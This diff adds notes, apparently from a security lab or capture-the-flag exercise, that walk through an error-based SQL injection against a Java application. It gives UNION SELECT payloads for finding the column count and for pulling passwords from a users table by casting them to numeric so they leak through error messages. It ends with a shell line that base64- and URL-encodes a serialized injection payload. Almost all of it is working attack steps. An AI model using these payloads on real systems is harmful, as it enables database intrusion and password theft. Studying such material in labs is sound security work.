@@ -1,0 +1,20 @@
+# cd 008_code
+# javac data/session/token/Starter.java
+#
+# Start to check the sqli:
+# java data.session.token.Starter "' UNION SELECT NULL, NULL, NULL, cast(password as numeric), NULL,    NULL, NULL, NULL FROM users--"
+#
+# The use error based sqli
+#
+# Determine number of columns
+#
+# java data.session.token.Starter "' UNION SELECT NULL, NULL, NULL, ... , NULL"
+#
+# until you know. 
+#
+# Result 8
+#
+# Then use:
+#
+# java data.session.token.Starter "' UNION SELECT NULL, NULL, NULL, cast(password as numeric), NULL, NULL, NULL, NULL FROM users--"
+urlencode $(cat serialsqli.txt|base64|tr -d '\n')
